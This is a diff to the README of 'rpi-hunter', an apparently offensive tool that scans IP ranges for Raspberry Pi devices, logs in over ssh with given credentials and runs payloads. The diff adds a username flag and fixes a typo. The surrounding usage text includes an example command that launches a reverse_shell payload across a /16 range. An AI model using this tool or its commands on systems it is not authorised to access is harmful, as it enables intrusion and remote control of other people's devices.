@@ -27,6 +27,7 @@ optional arguments:
   --no-scan          Disable ARP scanning
   -r IP_RANGE        IP range to scan
   -f IP_LIST         IP list to use (Default ./scan/RPI_list)
+  -u UNAME           Username to use when ssh'ing
   -c CREDS           Password to use when ssh'ing
   --payload PAYLOAD  (Name of, or raw) Payload [ex. reverse_shell or 'whoami']
   -H HOST            (If using reverse_shell payload) Host for reverse shell
@@ -36,7 +37,7 @@ optional arguments:
 ```
 * Example usage: `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337` 
 * Run `./rpi-hunter.py --list` to see avalible payloads.
-* Payloads can be specified by the payload name from `--list` or as raw iput
+* Payloads can be specified by the payload name from `--list` or as raw input
     * ex. `--payload reverse_shell` or `--payload [your cli command here]`
 
 ## Disclaimer
